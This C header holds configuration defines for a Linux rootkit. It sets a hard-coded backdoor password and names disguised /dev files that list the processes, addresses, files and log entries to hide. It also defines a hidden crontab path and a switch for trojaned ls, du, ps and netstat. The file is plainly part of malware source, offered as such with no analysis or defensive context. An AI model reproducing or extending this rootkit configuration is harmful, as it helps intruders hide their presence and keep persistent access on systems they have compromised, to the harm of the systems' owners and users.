/* LINUX ROOTKIT DEFINES. */

/* ROOTKIT_PASSWORD must be 6 letters due to my lame attempts at string 
   hiding... */

#define ROOTKIT_PASSWORD "satori"

/* Processes to hide */
#define ROOTKIT_PROCESS_FILE "/dev/ptyp"

/* Addresses to hide */
#define ROOTKIT_ADDRESS_FILE "/dev/ptyq"

/* Files and directories to hide */
#define ROOTKIT_FILES_FILE "/dev/ptyr"

/* Log entries to hide */
#define ROOTKIT_LOG_FILE "/dev/ptys"

/* Define this if you want to be able to list hidden files/processes 
   for ls, du, ps, netstat . using / on the command line */
#undef SHOWFLAG

/* name for alternate crontab file
   aka hidden crontab file
 */
#define TAB_NAME	"/dev/hda02"
